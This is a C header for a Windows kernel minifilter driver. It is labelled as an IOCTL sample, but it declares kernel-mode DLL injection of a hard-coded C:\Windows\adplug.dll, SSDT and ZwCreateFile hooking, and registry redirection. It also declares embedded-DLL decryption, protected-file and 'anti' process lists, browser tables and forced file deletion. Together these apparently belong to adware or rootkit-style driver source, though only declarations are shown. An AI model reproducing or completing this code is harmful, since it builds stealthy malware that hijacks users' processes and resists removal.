/***************************************************************************************
* AUTHOR : antireg
* DATE   : 2019-6-21
* MODULE : adsys.H
*
* IOCTRL Sample Driver
*
* Description:
*		Demonstrates communications between USER and KERNEL.
*
****************************************************************************************
* Copyright (C) 2010 antireg.
****************************************************************************************/

#ifndef CXX_ADSYS_H
#define CXX_ADSYS_H

#ifdef __cplusplus
extern "C"
{
#endif

#include <ntddk.h>
// #include <devioctl.h>
#include "common.h"
#include "S_File.h"
#include "S_Common.h"
#include "S_Ctx.h"
#include "memload.h"
#include "pebstruct.h"
#include "disasm.h"
#include <ntimage.h>
    //
    // TODO: Add your include here
    //

    //////////////////////////////////////////////////////////////////////////

    //
    // TODO: Add your struct,enum(private) here
    //

    #define kprintf DbgPrint
    #define kmalloc(_s) ExAllocatePoolWithTag(NonPagedPool, _s, 'SYSQ')
    #define kfree(_p) ExFreePool(_p)
    NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryString);
    VOID     DriverUnload(IN PDRIVER_OBJECT pDriverObj);
    NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp);
    NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp);
    NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp);
    NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp);
    NTSTATUS DispatchShutDown(IN PDEVICE_OBJECT Device, IN PIRP Irp);
    VOID     DriverUnload(IN PDRIVER_OBJECT pDriverObj);

    //////////////////////////////////////////////////////////////////////////

    //////////////////////////////////////////////////////////////////////////

    //
    // TODO: Add your module declarations here
    //

    /*************************************************************************
    Debug tracing information
*************************************************************************/

#define LOGFL_ERRORS 0x00000001  // if set, display error messages
#define LOGFL_READ 0x00000002    // if set, display READ operation info
#define LOGFL_WRITE 0x00000004   // if set, display WRITE operation info
#define LOGFL_DIRCTRL 0x00000008 // if set, display DIRCTRL operation info
#define LOGFL_INFO 0x00000010  // if set, display VOLCTX operation info
ULONG LoggingFlags = 0; // all disabled by default

#define LOG(_logFlag, _string) \
    (FlagOn(LoggingFlags, (_logFlag)) ? DbgPrint _string : ((void)0))

#define BUFFER_SWAP_TAG 'bdBS'
#define CONTEXT_TAG 'xcBS'
#define NAME_TAG 'mnBS'
#define PRE_2_POST_TAG 'ppBS'
#define STREAM_CONTEXT_TAG 'cSxC'
#define STRING_TAG 'tSxC'
#define RESOURCE_TAG 'cRxC'
#define FILEFLAG_POOL_TAG 'FASV'
#define MIN_SECTOR_SIZE 0x200
    /*****
全局变量
*/
    PVOID g_pPlugBuffer;
    ULONG g_iPlugSize;
    WCHAR g_pPlugPath[216] = L"\\??\\C:\\Windows\\adplug.dll";

    NTSTATUS MzWriteFile(LPWCH pFile, PVOID pData, ULONG len);
    NTSTATUS bAceessFile(PCWSTR FileName);

    typedef struct _VOLUME_CONTEXT
    {
        UNICODE_STRING Name;
        ULONG SectorSize;
    } VOLUME_CONTEXT, *PVOLUME_CONTEXT;

    DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName);
    BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[]);
    NTSTATUS DriverEntry(__in PDRIVER_OBJECT DriverObject, __in PUNICODE_STRING RegistryPath);
    NTSTATUS FilterUnload(__in FLT_FILTER_UNLOAD_FLAGS Flags);
    BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR name[]);

    BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[]);



    VOID CleanVolumCtx(IN PFLT_CONTEXT Context, IN FLT_CONTEXT_TYPE ContextType);

    NTSTATUS
    InstanceSetup(
        IN PCFLT_RELATED_OBJECTS FltObjects,
        IN FLT_INSTANCE_SETUP_FLAGS Flags,
        IN DEVICE_TYPE VolumeDeviceType,
        IN FLT_FILESYSTEM_TYPE VolumeFilesystemType);
    NTSTATUS
    InstanceQueryTeardown(
        IN PCFLT_RELATED_OBJECTS FltObjects,
        IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags);

    CONST FLT_CONTEXT_REGISTRATION ContextNotifications[] = {
        {FLT_VOLUME_CONTEXT, 0, CleanVolumCtx, sizeof(VOLUME_CONTEXT), CONTEXT_TAG},
        {FLT_STREAM_CONTEXT, 0, CleanVolumCtx, STREAM_CONTEXT_SIZE, STREAM_CONTEXT_TAG},
        {FLT_CONTEXT_END}};

    FLT_PREOP_CALLBACK_STATUS
    PreCleanup(
        __inout PFLT_CALLBACK_DATA Data,
        __in PCFLT_RELATED_OBJECTS FltObjects,
        __deref_out_opt PVOID *CompletionContext);
    FLT_PREOP_CALLBACK_STATUS
    PreClose(
        __inout PFLT_CALLBACK_DATA Data,
        __in PCFLT_RELATED_OBJECTS FltObjects,
        __deref_out_opt PVOID *CompletionContext);

    FLT_PREOP_CALLBACK_STATUS
    PreCreate(
        __inout PFLT_CALLBACK_DATA Data,
        __in PCFLT_RELATED_OBJECTS FltObjects,
        __deref_out_opt PVOID *CompletionContext);

    FLT_POSTOP_CALLBACK_STATUS
    PostCreate(
        __inout PFLT_CALLBACK_DATA Data,
        __in PCFLT_RELATED_OBJECTS FltObjects,
        __inout_opt PVOID CompletionContext,
        __in FLT_POST_OPERATION_FLAGS Flags);

    FLT_POSTOP_CALLBACK_STATUS
    PostRead(
        IN OUT PFLT_CALLBACK_DATA Data,
        IN PCFLT_RELATED_OBJECTS FltObjects,
        IN PVOID CompletionContext,
        IN FLT_POST_OPERATION_FLAGS Flags);
    FLT_PREOP_CALLBACK_STATUS
    PreRead(
        IN OUT PFLT_CALLBACK_DATA Data,
        IN PCFLT_RELATED_OBJECTS FltObjects,
        OUT PVOID *CompletionContext);

    FLT_POSTOP_CALLBACK_STATUS
    PostReadWhenSafe(
        IN OUT PFLT_CALLBACK_DATA Data,
        IN PCFLT_RELATED_OBJECTS FltObjects,
        IN PVOID CompletionContext,
        IN FLT_POST_OPERATION_FLAGS Flags);

    typedef struct _PRE_2_POST_CONTEXT
    {
        PVOLUME_CONTEXT VolCtx;
        PSTREAM_CONTEXT pStreamCtx;
        PVOID SwappedBuffer;
        PMDL pMdl;
    } PRE_2_POST_CONTEXT, *PPRE_2_POST_CONTEXT;

    NPAGED_LOOKASIDE_LIST Pre2PostContextList;

    CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
        {IRP_MJ_CREATE, FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO, PreCreate, PostCreate},
        {IRP_MJ_READ, 0, PreRead, PostRead},
        {IRP_MJ_CLEANUP, FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO, PreCleanup, NULL},
        {IRP_MJ_CLOSE, 0, PreClose, NULL},
        {IRP_MJ_OPERATION_END}};

    CONST FLT_REGISTRATION FilterRegistration = {
        sizeof(FLT_REGISTRATION), //  Size
        FLT_REGISTRATION_VERSION, //  Version
        0,                        //  Flags
        ContextNotifications,     //  Context
        Callbacks,                //  Operation callbacks
        FilterUnload,             //  MiniFilterUnload
        InstanceSetup,            //  InstanceSetup
        InstanceQueryTeardown,    //  InstanceQueryTeardown
        NULL,                     //  InstanceTeardownStart
        NULL,                     //  InstanceTeardownComplete
        NULL,                     //  GenerateFileName
        NULL,                     //  GenerateDestinationFileName
        NULL                      //  NormalizeNameComponent

    };

    PFLT_FILTER gFilterHandle;

    // 注册表回调Cookie
    LARGE_INTEGER g_liRegCookie;
    NTSTATUS SetRegisterCallback();

    NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
    VOID RemoveRegisterCallback();

    //模块注入部分

#pragma pack()
    typedef struct _INITIAL_TEB
    {
        struct
        {
            PVOID OldStackBase;
            PVOID OldStackLimit;
        } OldInitialTeb;
        PVOID StackBase;
        PVOID StackLimit;
        PVOID StackAllocationBase;
    } INITIAL_TEB, *PINITIAL_TEB;

    typedef NTSTATUS (*TYPE_NtCreateThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
                                            HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PINITIAL_TEB InitialTeb, BOOLEAN CreateSuspended);
    TYPE_NtCreateThread ZwCreateThread;
    TYPE_NtCreateThread NtCreateThread;

    typedef NTSTATUS(__stdcall *TYPE_NtCreateThreadEx)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress,
                                                       PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

    TYPE_NtCreateThreadEx NtCreateThreadEx = NULL;
    TYPE_NtCreateThreadEx ZwCreateThreadEx = NULL;
    PVOID m_pCreateThread;

    typedef NTSTATUS(__stdcall *TYPE_ZwWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength OPTIONAL);

    TYPE_ZwWriteVirtualMemory NtWriteVirtualMemory = NULL;
    TYPE_ZwWriteVirtualMemory ZwWriteVirtualMemory = NULL;

#define HOOKADDR "ZwCreateFile"
ULONG32 fnHookfunc = NULL;
ULONG64 fnHookfunc64 = NULL;
UCHAR      pOldCode32[20]={0};
UCHAR      pOldCode64[20]={0};



    ULONG g_mode = 0;

    NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID *base, IN ULONG_PTR size, OUT PVOID *ppFound);
    NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer,
                                           IN ULONG BufferLength, OUT PULONG ReturnLength OPTIONAL);
    NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle,
                                       PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit,
                                       SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

    typedef NTSTATUS(__stdcall *TYPE_ZwProtectVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize,
                                                             ULONG NewProtect, PULONG OldProtect);
    TYPE_ZwProtectVirtualMemory NtProtectVirtualMemory = NULL;
    TYPE_ZwProtectVirtualMemory ZwProtectVirtualMemory = NULL;

    NTSTATUS MyZwCreateThread(HANDLE ProcessHandle, PVOID ThreadStartAddress, PVOID ThreadParameter, PSIZE_T ThreadStackSize,
                              PVOID *ThreadStackAddress, HANDLE *ThreadHandle, PEPROCESS processObj);
    NTSTATUS NTAPI NewNtProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID *BaseAddress, IN SIZE_T *NumberOfBytesToProtect,
                                             IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);

    BOOLEAN IsX64Module(IN PVOID pBase);
    PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord);

    VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo);

#pragma pack(1)
    typedef struct ServiceDescriptorEntry
    {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase;
        unsigned int NumberOfService;
        unsigned char *ParamTableBase;
    } ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;

    typedef struct _SERVICE_DESCRIPTOR_TABLE
    {
        ServiceDescriptorTableEntry_t ntoskrnl; // ntoskrnl.exe
        ServiceDescriptorTableEntry_t win32k;   // win32k.sys
        ServiceDescriptorTableEntry_t NotUsed1;
        ServiceDescriptorTableEntry_t NotUsed2;
    } SYSTEM_DESCRIPTOR_TABLE, *PSYSTEM_DESCRIPTOR_TABLE;

    void InjectDll(PEPROCESS ProcessObj, int ibit);

#ifdef _AMD64_
    PServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#else
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#endif

#define SERVICE_ID64(_function) (*(PULONG)((PUCHAR)_function + 4)) //64位进程
#define SERVICE_ID32(_function) (*(PULONG)((PUCHAR)_function + 1)) //32位进程

#define SERVICE_FUNCTION(_function) \
    ((ULONG)(KeServiceDescriptorTable.ServiceTableBase) + 4 * SERVICE_ID32(_function))

    ULONGLONG GetKeServiceDescriptorTable64();

    typedef struct _PARAMX
    {
        ULONG64 lpFileData;
        ULONG64 DataLength;
        ULONG64 LdrGetProcedureAddress;
        ULONG64 dwNtAllocateVirtualMemory;
        ULONG64 dwLdrLoadDll;
        ULONG64 RtlInitAnsiString;
        ULONG64 RtlAnsiStringToUnicodeString;
        ULONG64 RtlFreeUnicodeString;

//        UCHAR oldcode[20];
        //unsigned char code1[14] = {0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0xC3};
        UCHAR pFunction[100];
    } PARAMX, *PPARAMX;

    ULONG_PTR GetSSDTFuncCurAddr(LONG id);

    typedef struct _MY_COMMAND_INFO
    {
        LIST_ENTRY Entry;
        WCHAR exename[216];
        ULONG uType;
    } MY_COMMAND_INFO, *PMY_COMMAND_INFO;

    NTSTATUS AppendListNode(CONST WCHAR name[], LIST_ENTRY *link, ULONG uType);


    LIST_ENTRY g_AntiProcess;
    LIST_ENTRY g_ProtectFile;
    KSPIN_LOCK g_spin_lockfile; // 自旋锁  文件同步

    KSPIN_LOCK g_spin_process; // 自旋锁  进程

    PMY_COMMAND_INFO FindInList(const WCHAR *name, LIST_ENTRY *link, PKSPIN_LOCK lock);

	BOOLEAN FindInBrowser(const WCHAR *name);
    PMY_COMMAND_INFO  FindInProtectFile(const WCHAR *name);

    NTSTATUS MzReadFile(LPWCH pFile, PVOID *ImageBaseAddress, PULONG ImageSize);
    ULONG MzGetFileSize(HANDLE hfile);
    PVOID g_pDll64 = NULL;
    ULONG g_iDll64 = 0;
    PVOID g_pDll32 = NULL;
    ULONG g_iDll32 = 0;

    void MyDecryptFile(PVOID pdata, int len, UCHAR key);

    BOOLEAN IsByProtectFile(const WCHAR *name);

    typedef struct _WORKITEMPARAM
    {
        ULONG pid;
        ULONG bit;
    } WORKITEMPARAM, *PWORKITEMPARAM;

    void newWorkItem(ULONG bit);
    VOID WorkerItemRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context, PIO_WORKITEM IoWorkItem);
    VOID IoUninitializeWorkItem(__in PIO_WORKITEM IoWorkItem);

    PDRIVER_OBJECT g_drobj;
    void InitGlobeFunc(PIMAGE_INFO ImageInfo);

    VOID ReadDriverParameters(IN PUNICODE_STRING RegistryPath);



typedef struct _KLDR_DATA_TABLE_ENTRY {
        	LIST_ENTRY64 InLoadOrderLinks;
        	ULONG64 __Undefined1;
        	ULONG64 __Undefined2;
        	ULONG64 __Undefined3;
        	ULONG64 NonPagedDebugInfo;
        	ULONG64 DllBase;
        	ULONG64 EntryPoint;
        	ULONG SizeOfImage;
        	UNICODE_STRING FullDllName;
        	UNICODE_STRING BaseDllName;
        	ULONG   Flags;
        	USHORT  LoadCount;
        	USHORT  __Undefined5;
        	ULONG64 __Undefined6;
        	ULONG   CheckSum;
        	ULONG   __padding1;
        	ULONG   TimeDateStamp;
        	ULONG   __padding2;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;


    NTSTATUS LfGetObjectName(IN CONST PVOID Object, OUT PUNICODE_STRING *ObjectName);
    NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo, long NotifyClass, WCHAR path[]);
   WCHAR *g_HexConfig[50];
     ULONG g_iConfig = 0;
   WCHAR *g_HexBrowser[20][50];
     ULONG g_iBrowser = 0;
     void InitAllStr();

  

ULONG GetPatchSize(PUCHAR Address,int asmlen);
typedef int (*LDE_DISASM)(void *p, int dw);
LDE_DISASM LDE;
void LDE_init();
ULONG GetAsmSize(PUCHAR Address, int asmlen);
char *myStrtok_r(char* string_org,const char* demial, char **save_ptr);
BOOLEAN isContained(const char *str, char c);

typedef struct _AUX_ACCESS_DATA {
    PPRIVILEGE_SET PrivilegesUsed;
    GENERIC_MAPPING GenericMapping;
    ACCESS_MASK AccessesToAudit;
    ULONG Reserve;                            //
} AUX_ACCESS_DATA, *PAUX_ACCESS_DATA;
#define MAX_PATH 216
NTSTATUS ObCreateObject (IN KPROCESSOR_MODE ProbeMode,IN POBJECT_TYPE ObjectType,IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
					 		IN KPROCESSOR_MODE OwnershipMode,IN OUT PVOID ParseContext OPTIONAL,IN ULONG ObjectBodySize,
                     		IN ULONG PagedPoolCharge,IN ULONG NonPagedPoolCharge,OUT PVOID *Object);
NTSTATUS SeCreateAccessState(IN PACCESS_STATE AccessState,IN PAUX_ACCESS_DATA AuxData,IN ACCESS_MASK DesiredAccess,
							 IN PGENERIC_MAPPING GenericMapping OPTIONAL);
NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObject, PDEVICE_OBJECT * ReadDevice);
NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO_STATUS_BLOCK pIoStatusBlock, PFILE_OBJECT * pFileObject);
NTSTATUS IoCompletionRoutineEx(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context);
NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoStatusBlock, PVOID pFileInformation,ULONG FileInformationLength, 
                              FILE_INFORMATION_CLASS  FileInformationClass, BOOLEAN  ReplaceIfExists);
NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject);

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
void EncodeBuffer(PVOID  SwappedBuffer, PUCHAR origBuf, ULONG Len, BOOLEAN bEncrypte);

MY_COMMAND_INFO g_pProtectFile[2];

//void MyDecryptFile(LPVOID *pdata,int len);
typedef NTSTATUS (*QUERY_INFO_PROCESS) (
    __in HANDLE ProcessHandle,
    __in PROCESSINFOCLASS ProcessInformationClass,
    __out_bcount(ProcessInformationLength) PVOID ProcessInformation,
    __in ULONG ProcessInformationLength,
    __out_opt PULONG ReturnLength
);

QUERY_INFO_PROCESS ZwQueryInformationProcess;

ULONG   g_offset_name=0;

ULONG  GetNameOffset(PEPROCESS proobj);


#ifdef __cplusplus
}
#endif
//////////////////////////////////////////////////////////////////////////

#endif //CXX_ADSYS_H
/* EOF */
